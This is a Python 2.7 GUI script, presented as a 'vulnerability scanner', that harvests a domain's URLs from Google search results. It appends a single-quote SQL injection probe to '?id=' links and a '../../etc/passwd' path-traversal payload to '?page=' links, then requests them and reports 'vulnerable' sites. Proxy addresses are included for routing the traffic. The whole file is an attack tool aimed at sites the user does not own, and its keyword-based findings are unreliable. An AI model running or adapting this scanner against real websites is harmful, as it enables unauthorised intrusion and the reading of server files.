# Python 2.7
# input type : url
########################
#   Coded By           #
#   Pradeep Jairamani  #
########################



from Tkinter import *
import requests
from bs4 import BeautifulSoup
import re
import urllib
import ttk

def callback():
    query=e.get()
    num = value1.get()
    print num
    i=0
    f = open(query+'.txt', 'w')    #open file
    http_proxy  = "http://97.84.14.116:8080/"
    https_proxy = "http://12.33.254.195:3128/"

    proxyDict = { 
                  "http"  : http_proxy, 
                  "https" : https_proxy
                  }
    while(i<num): #num= combobox drop down value
        page = requests.get("http://www.google.com/search?q=site:"+query+"&start="+str(i)) #,proxies=proxyDict) #Remove the Comment in proxies to use a proxy server
        soup = BeautifulSoup(page.content, 'html.parser')
        i=i+10
        j=0
        for link in  soup.find_all("a",href=re.compile("(?<=/url\?q=)(htt.*://.*)")):
            g= str((re.split(":(?=http)",link["href"].replace("/url?q=",""))))
            h= urllib.unquote(g)
            s= h.replace ("[u'", "")
            l= s.replace ("', u'","\n")
            k = l.replace ("https" , "http")
            p= k.replace ("']","")
            head, sep, tail = p.partition('&')
            if 'webcache' not in head and 'site:' not in head:
                if '?id=' in head:
                    f.write(head+ "'"+ "\n")
                if '?page' in head:
                    head, sep, tail = p.partition('=')
                    f.write(head+ "=../../../../../../../../../../../../../../etc/passwd" + "\n")
    f.close()
    


#bad_words = ['webcache', 'site:']

#with open(query+'.txt') as oldfile, open('newfile.txt', 'w') as newfile:
 #   for line in oldfile:
  #      if not any(bad_word in line for bad_word in bad_words):
   #         newfile.write(line)
    

    f2 = open(query+'.txt', 'r+')
    links = f2.readlines()
    words = ['sql' , 'MySQL' , 'SQL']
    words2 = ['root' ,'/etc/','/home/']
    for link in links:
        if '?id=' in link:
            flag=0
            site = urllib.urlopen(link).read()
            for word in words:
                flag=0
                if word in site:
                    flag=1
                if flag==1:
                    str1= str("[SQLI] Vulnerability found at  " + link)
                    listbox.insert(END, str1)
        if '?page=' in link:
            site = urllib.urlopen(link).read()
            for word2 in words2:
                flag=0
                if word2 in site:
                    flag=1
                if flag==1:
                    str2= str("[LFI] Vulnerability found at " + link)
                    listbox.insert(END, str2)
            

    #f2.seek(0)
    #for i in d:
     #   if i != "http://webcache.googleusercontent.com/":
      #      f2.write(i)
    #f2.truncate()
    f2.close()

master = Tk()
master.title('VULNERABILITY SCANNER')
e = Entry(master)
e.pack(fill=X)
e.pack()
w = Label(master, text=":.: Website Vulnerability Scanner Tool :.:",fg="blue",font=("Helvetica -14 bold"))
w.pack()
e.focus_set()
b = Button(master, text=">>>", width=10, command=callback, bg="black", fg="green")
b.pack()
listbox = Listbox(master, bg="black",fg="green",width =80)
listbox.pack()
value1=IntVar()
#master.option_add("*TCombobox*Listbox*Background", 'green')
drop = ttk.Combobox(master,textvariable=value1,width=5, state='readonly')
drop['values']=('10','20','30','40','50','60','70','80','90','100')
drop.current(0)
drop.place(x=433,y=0)


mainloop()




